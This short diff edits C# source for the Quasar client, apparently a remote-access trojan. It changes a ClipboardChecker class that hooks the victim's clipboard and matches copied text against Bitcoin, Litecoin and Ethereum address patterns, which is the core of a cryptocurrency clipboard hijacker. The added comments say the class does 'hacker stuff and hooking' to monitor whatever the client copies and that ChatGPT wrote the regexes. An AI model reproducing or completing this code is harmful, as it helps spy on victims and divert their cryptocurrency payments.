@@ -9,6 +9,7 @@ using Quasar.Common.Messages.Monitoring.Clipboard;
 
 namespace Quasar.Client.User
 {
+    // do some hacker stuff and hooking and it'll monitor whenevrr client copies
     internal class ClipboardChecker : NativeWindow, IDisposable
     {
         private readonly QuasarClient _client;
@@ -27,6 +28,8 @@ namespace Quasar.Client.User
             _client = client;
             _regexPatterns = new List<Tuple<string, Regex>>
             {
+                // the regex is made by chatgpt so like idk if they ALWAYS work, but they should
+
                 new Tuple<string, Regex>("BTC", new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),  // BTC regex
                 new Tuple<string, Regex>("LTC", new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),    // LTC regex
                 new Tuple<string, Regex>("ETH", new Regex(@"^0x[a-fA-F0-9]{40}$")),             // ETH regex
